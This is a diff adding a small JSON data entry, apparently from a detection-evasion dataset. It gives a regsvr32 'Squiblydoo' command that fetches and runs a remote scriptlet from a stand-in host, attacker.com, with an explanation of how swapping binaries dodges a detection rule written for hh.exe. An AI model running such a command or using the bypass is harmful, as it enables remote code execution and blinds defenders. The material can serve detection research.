@@ -1,0 +1,6 @@
+[
+  {
+    "output": "regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll",
+    "explanation": "This is a functional bypass by technique substitution. Since the goal is remote file execution/download, using a different built-in Windows binary like regsvr32.exe (Squiblydoo) achieves the same objective while completely avoiding the hh.exe selection criteria defined in this specific rule."
+  }
+]
